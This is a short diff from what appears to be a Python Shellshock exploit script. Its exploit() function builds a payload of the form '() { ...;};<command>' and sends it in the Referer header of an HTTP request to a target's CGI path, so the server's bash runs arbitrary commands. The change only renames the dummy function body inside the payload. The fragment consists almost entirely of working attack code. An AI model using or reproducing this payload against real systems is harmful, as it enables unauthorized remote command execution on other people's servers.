@@ -33,7 +33,7 @@ def exploit(target_host, cgi_path, command):
     else:
         conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
 
-    shellcode="() { gmvaudit;};%s" % command
+    shellcode="() { gry;};%s" % command
 
     headers = {"Content-type": "application/x-www-form-urlencoded",
         "Referer": shellcode,
